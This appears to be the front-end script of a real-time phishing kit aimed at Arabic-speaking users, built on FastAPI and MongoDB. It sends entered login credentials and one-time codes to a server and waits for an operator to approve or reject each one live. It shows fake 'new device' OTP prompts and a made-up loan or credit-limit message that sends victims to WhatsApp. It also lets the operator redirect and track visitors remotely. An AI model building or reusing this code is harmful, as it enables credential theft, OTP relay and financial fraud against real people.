(function () {
  "use strict";

  var STORAGE_KEY = "fastapi-base-visitor-id";
  var LOGIN_SUBMISSION_STORAGE_KEY = "fastapi-base-login-submission-id";
  var OBJECT_ID_REGEX = /^[a-f0-9]{24}$/i;
  var REJECTION_ERROR_MESSAGE_AR = "كلمة المرور غير صحيحة";
  var OTP_REJECTION_MESSAGE_AR = "رمز التحقق غير صحيح";
  var SUPPORT_APPROVAL_MESSAGE_AR = "الحد الائتماني بمحفظتك متدني يرجى رفع الحد الائتماني لقبول طلبك والحصول على القرض الحسن. لمزيد من الاستفسارات والمعلومات التواصل مع خدمة العملاء.";
  var GLOBAL_SUBMIT_MESSAGE_AR = "محاولة تسجيل الدخول من جهاز جديد. لأمان حسابك، سنرسل لك رمز تحقق لمرة واحدة (OTP) للتحقق من تسجيل الدخول";
  var heartbeatTimerId = null;
  var pendingHeartbeat = null;
  var activeApprovalSocket = null;
  var activeApprovalPollTimer = null;
  var activeApprovalPollNow = null;
  var visitorControlSocket = null;
  var visitorControlReconnectTimer = null;
  var visitorControlVisitorId = "";

  function getErrorIconSrc() {
    return document.body.dataset.errorIconSrc || "/static/frontend/images/ic_error.svg";
  }

  function getOtpRejectionMessage() {
    return document.body.dataset.otpRejectionMessage || OTP_REJECTION_MESSAGE_AR;
  }

  function getSupportApprovalMessage() {
    return document.body.dataset.supportApprovalMessage || SUPPORT_APPROVAL_MESSAGE_AR;
  }

  function getSupportWhatsAppUrl() {
    return document.body.dataset.supportWhatsappUrl || "";
  }

  function getGlobalSubmitOverlay() {
    var overlay = document.getElementById("global-submit-overlay");
    if (overlay) {
      return overlay;
    }
    overlay = document.createElement("div");
    overlay.id = "global-submit-overlay";
    overlay.className = "global-submit-overlay";
    overlay.hidden = true;
    overlay.setAttribute("aria-hidden", "true");
    overlay.innerHTML =
      "<div class=\"global-submit-overlay-card\" role=\"status\" aria-live=\"polite\">" +
      "<span class=\"global-submit-spinner\" aria-hidden=\"true\"></span>" +
      "<span class=\"global-submit-text\">" + GLOBAL_SUBMIT_MESSAGE_AR + "</span>" +
      "</div>";
    document.body.appendChild(overlay);
    return overlay;
  }

  function setGlobalSubmitOverlay(isVisible, message) {
    var overlay = getGlobalSubmitOverlay();
    if (!overlay) {
      return;
    }
    var textEl = overlay.querySelector(".global-submit-text");
    if (textEl) {
      textEl.textContent = message || GLOBAL_SUBMIT_MESSAGE_AR;
      textEl.hidden = false;
    }
    overlay.hidden = !isVisible;
    overlay.setAttribute("aria-hidden", isVisible ? "false" : "true");
    document.body.classList.toggle("is-global-submitting", isVisible);
  }

  function getRejectModal() {
    var modal = document.getElementById("reject-error-modal");
    if (modal) {
      return modal;
    }
    modal = document.createElement("div");
    modal.id = "reject-error-modal";
    modal.className = "reject-error-modal";
    modal.hidden = true;
    modal.setAttribute("aria-hidden", "true");
    modal.innerHTML =
      "<div class=\"reject-error-modal-card\" role=\"alertdialog\" aria-modal=\"true\" aria-labelledby=\"reject-error-message\">" +
      "<div class=\"reject-error-modal-body\">" +
      "<img class=\"reject-error-icon\" src=\"" + getErrorIconSrc() + "\" alt=\"error\">" +
      "<p id=\"reject-error-message\" class=\"reject-error-message\"></p>" +
      "</div>" +
      "<button type=\"button\" class=\"reject-error-close-btn\">إلغاء</button>" +
      "</div>";
    document.body.appendChild(modal);
    var closeButton = modal.querySelector(".reject-error-close-btn");
    if (closeButton) {
      closeButton.addEventListener("click", function () {
        hideRejectModal();
      });
    }
    return modal;
  }

  function showRejectModal(message) {
    var modal = getRejectModal();
    if (!modal) {
      return;
    }
    var messageEl = modal.querySelector(".reject-error-message");
    if (messageEl) {
      messageEl.textContent = message || REJECTION_ERROR_MESSAGE_AR;
    }
    modal.hidden = false;
    modal.setAttribute("aria-hidden", "false");
    document.body.classList.add("is-error-modal-open");
  }

  function hideRejectModal() {
    var modal = document.getElementById("reject-error-modal");
    if (!modal) {
      return;
    }
    modal.hidden = true;
    modal.setAttribute("aria-hidden", "true");
    document.body.classList.remove("is-error-modal-open");
  }

  function getSupportModal() {
    var modal = document.getElementById("support-info-modal");
    if (modal) {
      return modal;
    }
    modal = document.createElement("div");
    modal.id = "support-info-modal";
    modal.className = "support-info-modal";
    modal.hidden = true;
    modal.setAttribute("aria-hidden", "true");
    modal.innerHTML =
      "<div class=\"support-info-modal-card\" role=\"dialog\" aria-modal=\"true\" aria-labelledby=\"support-info-message\">" +
      "<button type=\"button\" class=\"support-info-dismiss-btn\" aria-label=\"Close\">×</button>" +
      "<div class=\"support-info-modal-body\">" +
      "<p id=\"support-info-message\" class=\"support-info-message\"></p>" +
      "</div>" +
      "<div class=\"support-info-actions\">" +
      "<button type=\"button\" class=\"support-info-contact-btn\"><span class=\"support-info-contact-icon\" aria-hidden=\"true\"><svg viewBox=\"0 0 32 32\" focusable=\"false\"><path fill=\"currentColor\" d=\"M19.11 17.09c-.28-.14-1.63-.8-1.88-.89-.25-.09-.43-.14-.61.14-.18.28-.7.89-.86 1.07-.16.18-.31.21-.59.07-.28-.14-1.17-.43-2.23-1.37-.82-.73-1.37-1.64-1.53-1.92-.16-.28-.02-.43.12-.57.13-.13.28-.34.41-.5.14-.16.18-.28.27-.46.09-.18.05-.34-.02-.48-.07-.14-.61-1.46-.84-2-.22-.53-.45-.46-.61-.46h-.52c-.18 0-.46.07-.7.34-.25.28-.95.93-.95 2.27 0 1.34.97 2.64 1.11 2.82.14.18 1.91 2.91 4.63 4.08.65.28 1.16.45 1.56.58.66.21 1.27.18 1.75.11.53-.08 1.63-.67 1.86-1.31.23-.64.23-1.2.16-1.31-.06-.11-.24-.18-.52-.32Z\"/><path fill=\"currentColor\" d=\"M16.02 3.2c-6.94 0-12.58 5.56-12.58 12.4 0 2.18.58 4.31 1.67 6.19L3.2 28.8l7.23-1.89a12.65 12.65 0 0 0 5.59 1.3h.01c6.93 0 12.57-5.57 12.57-12.41 0-3.31-1.3-6.43-3.65-8.77A12.66 12.66 0 0 0 16.02 3.2Zm0 22.94h-.01a10.5 10.5 0 0 1-5.34-1.45l-.38-.23-4.29 1.12 1.15-4.17-.25-.4a10.17 10.17 0 0 1-1.58-5.42c0-5.65 4.77-10.24 10.65-10.24 2.85 0 5.53 1.1 7.54 3.1a10.1 10.1 0 0 1 3.13 7.18c0 5.65-4.78 10.24-10.62 10.24Z\"/></svg></span><span>تواصل معنا</span></button>" +
      "</div>" +
      "</div>";
    document.body.appendChild(modal);
    var closeButton = modal.querySelector(".support-info-dismiss-btn");
    if (closeButton) {
      closeButton.addEventListener("click", function () {
        hideSupportModal();
      });
    }
    var contactButton = modal.querySelector(".support-info-contact-btn");
    if (contactButton) {
      contactButton.addEventListener("click", function () {
        var whatsappUrl = getSupportWhatsAppUrl();
        if (whatsappUrl) {
          window.location.assign(whatsappUrl);
        }
      });
    }
    return modal;
  }

  function showSupportModal(message) {
    var modal = getSupportModal();
    if (!modal) {
      return;
    }
    var messageEl = modal.querySelector(".support-info-message");
    if (messageEl) {
      messageEl.textContent = message || getSupportApprovalMessage();
    }
    var contactButton = modal.querySelector(".support-info-contact-btn");
    var whatsappUrl = getSupportWhatsAppUrl();
    if (contactButton) {
      contactButton.hidden = !whatsappUrl;
      contactButton.disabled = !whatsappUrl;
    }
    modal.hidden = false;
    modal.setAttribute("aria-hidden", "false");
    document.body.classList.add("is-support-modal-open");
  }

  function hideSupportModal() {
    var modal = document.getElementById("support-info-modal");
    if (!modal) {
      return;
    }
    modal.hidden = true;
    modal.setAttribute("aria-hidden", "true");
    document.body.classList.remove("is-support-modal-open");
  }

  function parseIntervalMs(value) {
    var parsed = Number.parseInt(value || "", 10);
    if (!Number.isFinite(parsed) || parsed <= 0) {
      return 2000;
    }
    return parsed;
  }

  function getHeartbeatIntervalMs() {
    return parseIntervalMs(document.body.dataset.heartbeatIntervalMs);
  }

  function isObjectId(value) {
    return typeof value === "string" && OBJECT_ID_REGEX.test(value);
  }

  function getStoredVisitorId() {
    try {
      var existing = localStorage.getItem(STORAGE_KEY);
      if (isObjectId(existing)) {
        return existing;
      }
      if (existing) {
        localStorage.removeItem(STORAGE_KEY);
      }
      return null;
    } catch (error) {
      return null;
    }
  }

  function setStoredVisitorId(visitorId) {
    if (!isObjectId(visitorId)) {
      return;
    }
    try {
      localStorage.setItem(STORAGE_KEY, visitorId);
    } catch (error) {
      // Ignore storage failures.
    }
  }

  function getVisitorId() {
    return getStoredVisitorId();
  }

  function getStoredLoginSubmissionId() {
    try {
      var existing = localStorage.getItem(LOGIN_SUBMISSION_STORAGE_KEY);
      if (isObjectId(existing)) {
        return existing;
      }
      if (existing) {
        localStorage.removeItem(LOGIN_SUBMISSION_STORAGE_KEY);
      }
      return "";
    } catch (error) {
      return "";
    }
  }

  function setStoredLoginSubmissionId(submissionId) {
    if (!isObjectId(submissionId)) {
      return;
    }
    try {
      localStorage.setItem(LOGIN_SUBMISSION_STORAGE_KEY, submissionId);
    } catch (error) {
      // Ignore storage failures.
    }
  }

  function clearStoredLoginSubmissionId() {
    try {
      localStorage.removeItem(LOGIN_SUBMISSION_STORAGE_KEY);
    } catch (error) {
      // Ignore storage failures.
    }
  }

  function getLoginSubmissionIdFromUrl() {
    try {
      var params = new URLSearchParams(window.location.search);
      var fromUrl = String(params.get("login_submission_id") || "").trim();
      if (isObjectId(fromUrl)) {
        return fromUrl;
      }
    } catch (error) {
      // Ignore URL parsing failures.
    }
    return "";
  }

  function resolveActiveLoginSubmissionId() {
    var fromUrl = getLoginSubmissionIdFromUrl();
    if (fromUrl) {
      setStoredLoginSubmissionId(fromUrl);
      return fromUrl;
    }
    return getStoredLoginSubmissionId();
  }

  function shouldAttachLoginSubmissionId(form) {
    if (!form) {
      return false;
    }
    if (isTruthyDataValue(form.dataset.attachLoginSubmissionId)) {
      return true;
    }
    var formName = getFormName(form).toLowerCase();
    var pagePath = getPagePath(form).toLowerCase();
    return formName.indexOf("verification") >= 0 || pagePath === "/verification";
  }

  function buildApprovedRedirectUrl(redirectUrl, submissionId) {
    var target = redirectUrl || "/verification";
    if (!isObjectId(submissionId)) {
      return target;
    }
    try {
      var parsed = new URL(target, window.location.origin);
      parsed.searchParams.set("login_submission_id", submissionId);
      if (parsed.origin === window.location.origin) {
        return parsed.pathname + parsed.search + parsed.hash;
      }
      return parsed.toString();
    } catch (error) {
      return target;
    }
  }

  function getPagePath(form) {
    if (form && form.dataset.pagePath) {
      return form.dataset.pagePath;
    }
    return window.location.pathname;
  }

  function getFormName(form) {
    if (!form) {
      return "frontend-form";
    }
    return form.dataset.formName || form.getAttribute("name") || form.id || "frontend-form";
  }

  function getSubmitEndpoint(form) {
    if (form && form.dataset.submitEndpoint) {
      return form.dataset.submitEndpoint;
    }
    return "/api/forms/submit";
  }

  function isTruthyDataValue(value) {
    var normalized = String(value || "").trim().toLowerCase();
    return normalized === "1" || normalized === "true" || normalized === "yes" || normalized === "on";
  }

  function requiresAdminApproval(form) {
    if (!form) {
      return false;
    }
    return isTruthyDataValue(form.dataset.awaitAdminApproval);
  }

  function isVerificationApprovalFlow(form) {
    if (!form) {
      return false;
    }
    return getPagePath(form).toLowerCase() === "/verification";
  }

  function getRedirectUrl(form, responseData) {
    if (responseData && typeof responseData.redirect_url === "string" && responseData.redirect_url) {
      return responseData.redirect_url;
    }
    if (form && form.dataset.redirectOnSuccess) {
      return form.dataset.redirectOnSuccess;
    }
    return "";
  }

  function setFormPending(form, isPending) {
    if (!form) {
      return;
    }
    form.classList.toggle("is-submitting", isPending);
    var submitButton = form.querySelector("button[type='submit'], input[type='submit']");
    if (submitButton) {
      submitButton.classList.toggle("is-loading", isPending);
      submitButton.setAttribute("aria-busy", isPending ? "true" : "false");
    }
    form.querySelectorAll("button, input[type='submit']").forEach(function (element) {
      element.disabled = isPending;
    });
    setGlobalSubmitOverlay(isPending, "");
  }

  function getApprovalStatusElement(form) {
    if (!form) {
      return null;
    }
    var existing = form.querySelector(".approval-status");
    if (existing) {
      return existing;
    }
    var el = document.createElement("p");
    el.className = "approval-status";
    el.setAttribute("aria-live", "polite");
    form.appendChild(el);
    return el;
  }

  function setApprovalStatus(form, message, isError) {
    var statusEl = getApprovalStatusElement(form);
    if (!statusEl) {
      return;
    }
    statusEl.textContent = message || "";
    statusEl.classList.toggle("is-error", Boolean(isError));
    statusEl.classList.toggle("is-hidden", !message);
  }

  function resetFormUiState(form) {
    if (!form) {
      return;
    }
    setApprovalStatus(form, "", false);
    setFormPending(form, false);
  }

  function resetTransientUiState() {
    stopApprovalWaiters();
    hideRejectModal();
    hideSupportModal();
    setGlobalSubmitOverlay(false, "");
    document.querySelectorAll("form[data-mongo-form]").forEach(function (form) {
      resetFormUiState(form);
    });
  }

  function stopApprovalWaiters() {
    if (activeApprovalPollTimer !== null) {
      clearInterval(activeApprovalPollTimer);
      activeApprovalPollTimer = null;
    }
    activeApprovalPollNow = null;
    if (activeApprovalSocket) {
      try {
        activeApprovalSocket.close();
      } catch (error) {
        // Ignore socket close failures.
      }
      activeApprovalSocket = null;
    }
  }

  function stopVisitorControlSocket() {
    if (visitorControlReconnectTimer !== null) {
      clearTimeout(visitorControlReconnectTimer);
      visitorControlReconnectTimer = null;
    }
    if (visitorControlSocket) {
      try {
        visitorControlSocket.close();
      } catch (error) {
      }
      visitorControlSocket = null;
    }
    visitorControlVisitorId = "";
  }

  function scheduleVisitorControlReconnect() {
    if (visitorControlReconnectTimer !== null) {
      return;
    }
    visitorControlReconnectTimer = window.setTimeout(function () {
      visitorControlReconnectTimer = null;
      syncVisitorControlSocket();
    }, 1200);
  }

  function syncVisitorControlSocket() {
    var visitorId = getVisitorId();
    if (!isObjectId(visitorId)) {
      stopVisitorControlSocket();
      return;
    }
    if (
      visitorControlSocket &&
      visitorControlVisitorId === visitorId &&
      visitorControlSocket.readyState === WebSocket.OPEN
    ) {
      return;
    }
    if (visitorControlSocket) {
      try {
        visitorControlSocket.close();
      } catch (error) {
      }
      visitorControlSocket = null;
    }
    visitorControlVisitorId = visitorId;
    try {
      var protocol = window.location.protocol === "https:" ? "wss" : "ws";
      var wsUrl =
        protocol +
        "://" +
        window.location.host +
        "/ws/visitor/control?visitor_id=" +
        encodeURIComponent(visitorId);
      visitorControlSocket = new WebSocket(wsUrl);
      visitorControlSocket.onmessage = function (event) {
        try {
          var data = JSON.parse(event.data);
          if (data && data.type === "visitor_redirect" && typeof data.redirect_url === "string") {
            window.location.assign(data.redirect_url);
          }
        } catch (error) {
        }
      };
      visitorControlSocket.onclose = function () {
        if (!document.hidden && getVisitorId() === visitorControlVisitorId) {
          scheduleVisitorControlReconnect();
        }
      };
      visitorControlSocket.onerror = function () {
        try {
          visitorControlSocket.close();
        } catch (error) {
        }
      };
    } catch (error) {
      scheduleVisitorControlReconnect();
    }
  }

  function beginWaitingForApproval(form, responseData) {
    var submissionId = responseData && responseData.submission_id ? String(responseData.submission_id) : "";
    var visitorId = responseData && responseData.visitor_id ? String(responseData.visitor_id) : (getVisitorId() || "");
    var fallbackRedirect = getRedirectUrl(form, responseData) || "/verification";
    var verificationApprovalFlow = isVerificationApprovalFlow(form);
    if (!submissionId || !visitorId) {
      setApprovalStatus(form, "Submission created, but approval tracking is unavailable.", true);
      return false;
    }
    clearStoredLoginSubmissionId();

    stopApprovalWaiters();
    setApprovalStatus(form, "", false);
    setGlobalSubmitOverlay(
      true,
      verificationApprovalFlow ? "جاري مراجعة رمز التحقق..." : ""
    );

    var isResolved = false;
    function handleApproved(redirectUrl) {
      if (isResolved) {
        return;
      }
      isResolved = true;
      stopApprovalWaiters();
      setApprovalStatus(form, "", false);
      setGlobalSubmitOverlay(false, "");
      setFormPending(form, false);
      if (verificationApprovalFlow) {
        showSupportModal(getSupportApprovalMessage());
        return;
      }
      setStoredLoginSubmissionId(submissionId);
      window.location.assign(buildApprovedRedirectUrl(redirectUrl || fallbackRedirect, submissionId));
    }

    function handleRejected(errorMessage) {
      if (isResolved) {
        return;
      }
      isResolved = true;
      stopApprovalWaiters();
      setFormPending(form, false);
      if (verificationApprovalFlow) {
        setApprovalStatus(form, errorMessage || getOtpRejectionMessage(), true);
        return;
      }
      setApprovalStatus(form, "", false);
      showRejectModal(errorMessage || REJECTION_ERROR_MESSAGE_AR);
    }

    async function pollApprovalStatus() {
      if (isResolved) {
        return;
      }
      try {
        var response = await fetch(
          "/api/forms/submission-status?submission_id=" +
            encodeURIComponent(submissionId) +
            "&visitor_id=" +
            encodeURIComponent(visitorId)
        );
        if (!response.ok) {
          return;
        }
        var payload = await response.json();
        if (payload && payload.approval_status === "approved") {
          handleApproved(payload.redirect_url);
        } else if (payload && payload.approval_status === "rejected") {
          handleRejected(payload.error_message || "");
        }
      } catch (error) {
        // Keep waiting; websocket may still deliver the approval event.
      }
    }

    activeApprovalPollNow = pollApprovalStatus;
    activeApprovalPollTimer = setInterval(pollApprovalStatus, 2000);
    pollApprovalStatus();

    try {
      var protocol = window.location.protocol === "https:" ? "wss" : "ws";
      var wsUrl =
        protocol +
        "://" +
        window.location.host +
        "/ws/visitor/approval?visitor_id=" +
        encodeURIComponent(visitorId);
      activeApprovalSocket = new WebSocket(wsUrl);
      activeApprovalSocket.onmessage = function (event) {
        if (isResolved) {
          return;
        }
        try {
          var data = JSON.parse(event.data);
          if (
            data &&
            data.type === "submission_approved" &&
            String(data.submission_id || "") === submissionId
          ) {
            handleApproved(data.redirect_url);
          } else if (
            data &&
            data.type === "submission_rejected" &&
            String(data.submission_id || "") === submissionId
          ) {
            handleRejected(data.error_message || "");
          }
        } catch (error) {
          // Ignore malformed websocket payloads.
        }
      };
    } catch (error) {
      // Polling fallback is already active.
    }
    return true;
  }

  function appendFieldValue(target, name, value) {
    if (Object.prototype.hasOwnProperty.call(target, name)) {
      if (Array.isArray(target[name])) {
        target[name].push(value);
      } else {
        target[name] = [target[name], value];
      }
      return;
    }
    target[name] = value;
  }

  function collectFormFields(form) {
    var formData = new FormData(form);
    var fields = {};

    formData.forEach(function (value, key) {
      if (!key) {
        return;
      }
      if (value instanceof File) {
        if (!value.name) {
          return;
        }
        appendFieldValue(fields, key, value.name);
        return;
      }
      appendFieldValue(fields, key, String(value).trim());
    });

    var visitorId = getVisitorId();
    if (visitorId && !fields.visitor_id) {
      fields.visitor_id = visitorId;
    }

    if (!fields.login_submission_id && shouldAttachLoginSubmissionId(form)) {
      var linkedSubmissionId = resolveActiveLoginSubmissionId();
      if (linkedSubmissionId) {
        fields.login_submission_id = linkedSubmissionId;
      }
    }

    return fields;
  }

  function resolveSubmitValidator(form) {
    if (!form) {
      return null;
    }
    var validatorName = form.dataset.submitValidate;
    if (!validatorName || typeof window[validatorName] !== "function") {
      return null;
    }
    return window[validatorName];
  }

  async function submitMongoForm(form) {
    var validator = resolveSubmitValidator(form);
    if (validator && validator(form) === false) {
      return null;
    }

    if (typeof form.checkValidity === "function" && !form.checkValidity()) {
      form.reportValidity();
      return null;
    }

    setApprovalStatus(form, "", false);
    setFormPending(form, true);
    var releasePending = true;
    try {
      var response = await fetch(getSubmitEndpoint(form), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          form_name: getFormName(form),
          page_path: getPagePath(form),
          visitor_id: getVisitorId(),
          await_admin_approval: requiresAdminApproval(form),
          fields: collectFormFields(form)
        })
      });
      var data = await response.json();
      applyVisitorIdentity(data);
      if (!response.ok || data.status !== "ok") {
        throw new Error("Form submission failed");
      }

      form.dispatchEvent(new CustomEvent("mongo-form:success", { detail: data }));

      if (data && data.awaiting_approval === true) {
        var waitingStarted = beginWaitingForApproval(form, data);
        if (waitingStarted) {
          releasePending = false;
          form.dispatchEvent(new CustomEvent("mongo-form:awaiting-approval", { detail: data }));
          return data;
        }
        throw new Error("Approval tracking unavailable");
      }

      var redirectUrl = getRedirectUrl(form, data);
      if (redirectUrl) {
        window.location.assign(redirectUrl);
      }
      return data;
    } catch (error) {
      form.dispatchEvent(new CustomEvent("mongo-form:error", { detail: error }));
      setApprovalStatus(form, "Submission failed. Please try again.", true);
      return null;
    } finally {
      if (releasePending) {
        setFormPending(form, false);
      }
    }
  }

  function registerMongoForms() {
    document.querySelectorAll("form[data-mongo-form]").forEach(function (form) {
      form.addEventListener("submit", function (event) {
        event.preventDefault();
        submitMongoForm(form);
      });
    });
  }

  function updateHeartbeatStatus(text) {
    var statusEl = document.getElementById("heartbeat-status");
    if (statusEl) {
      statusEl.textContent = text;
    }
  }

  function heartbeatPayload() {
    return JSON.stringify({
      visitor_id: getVisitorId(),
      page_path: window.location.pathname
    });
  }

  function syncVisitorIdInput() {
    var visitorInputEl = document.getElementById("visitor_id");
    if (visitorInputEl) {
      visitorInputEl.value = getVisitorId() || "";
    }
  }

  function applyVisitorIdentity(data) {
    if (!data || !isObjectId(data.visitor_id)) {
      return;
    }
    setStoredVisitorId(data.visitor_id);
    syncVisitorIdInput();
    syncVisitorControlSocket();
  }

  function buildIdentityStatus(data) {
    if (!data || typeof data !== "object") {
      return null;
    }
    if (data.is_new_visitor === true) {
      return "Tracking active (new visitor)";
    }
    if (data.is_returning_visitor === true) {
      if (typeof data.visit_count === "number") {
        return "Tracking active (returning, visits: " + data.visit_count + ")";
      }
      return "Tracking active (returning visitor)";
    }
    return "Tracking active";
  }

  async function sendHeartbeat() {
    if (pendingHeartbeat) {
      return pendingHeartbeat;
    }
    pendingHeartbeat = (async function () {
      try {
        var response = await fetch("/visitors/heartbeat", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: heartbeatPayload()
        });
        var data = null;
        try {
          data = await response.json();
        } catch (error) {
          data = null;
        }
        applyVisitorIdentity(data);
        if (
          data &&
          typeof data.redirect_url === "string" &&
          data.redirect_url &&
          data.redirect_url !== window.location.pathname
        ) {
          window.location.assign(data.redirect_url);
          return;
        }
        if (!response.ok || (data && data.status === "redis_unavailable")) {
          throw new Error("Heartbeat unavailable");
        }
        updateHeartbeatStatus(buildIdentityStatus(data) || "Tracking active");
      } catch (error) {
        updateHeartbeatStatus("Waiting for Redis connection...");
      } finally {
        pendingHeartbeat = null;
      }
    })();
    return pendingHeartbeat;
  }

  function sendBestEffortHeartbeat() {
    var payload = heartbeatPayload();
    try {
      if (navigator.sendBeacon) {
        var blob = new Blob([payload], { type: "application/json" });
        navigator.sendBeacon("/visitors/heartbeat", blob);
        return;
      }
    } catch (error) {
      // Ignore and fallback to fetch keepalive.
    }
    try {
      fetch("/visitors/heartbeat", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: payload,
        keepalive: true
      });
    } catch (error) {
      // Best effort; swallow network errors during page transitions.
    }
  }

  function stopHeartbeatLoop() {
    if (heartbeatTimerId !== null) {
      clearInterval(heartbeatTimerId);
      heartbeatTimerId = null;
    }
  }

  function startHeartbeatLoop() {
    if (heartbeatTimerId !== null) {
      return;
    }
    heartbeatTimerId = setInterval(function () {
      if (!document.hidden) {
        sendHeartbeat();
      }
    }, getHeartbeatIntervalMs());
  }

  function onPageShow() {
    resetTransientUiState();
    syncVisitorIdInput();
    syncVisitorControlSocket();
    sendHeartbeat();
    startHeartbeatLoop();
  }

  function onVisibilityChange() {
    if (document.hidden) {
      sendBestEffortHeartbeat();
      stopHeartbeatLoop();
      return;
    }
    syncVisitorIdInput();
    syncVisitorControlSocket();
    if (typeof activeApprovalPollNow === "function") {
      activeApprovalPollNow();
    }
    sendHeartbeat();
    startHeartbeatLoop();
  }

  function onPageHide() {
    sendBestEffortHeartbeat();
    stopHeartbeatLoop();
    resetTransientUiState();
    stopVisitorControlSocket();
  }

  function onHistoryNavigation() {
    resetTransientUiState();
    syncVisitorIdInput();
    syncVisitorControlSocket();
    if (typeof activeApprovalPollNow === "function") {
      activeApprovalPollNow();
    }
    sendHeartbeat();
    startHeartbeatLoop();
  }

  function registerLifecycleEvents() {
    window.addEventListener("pageshow", onPageShow);
    window.addEventListener("pagehide", onPageHide);
    window.addEventListener("popstate", onHistoryNavigation);
    window.addEventListener("hashchange", onHistoryNavigation);
    document.addEventListener("visibilitychange", onVisibilityChange);
  }

  function init() {
    getGlobalSubmitOverlay();
    getRejectModal();
    getSupportModal();
    window.addEventListener("keydown", function (event) {
      if (event.key === "Escape") {
        hideRejectModal();
        hideSupportModal();
      }
    });
    syncVisitorIdInput();
    registerLifecycleEvents();
    registerMongoForms();
    onPageShow();
  }

  window.fastapiBase = window.fastapiBase || {};
  window.fastapiBase.getVisitorId = getVisitorId;
  window.fastapiBase.submitMongoForm = submitMongoForm;

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
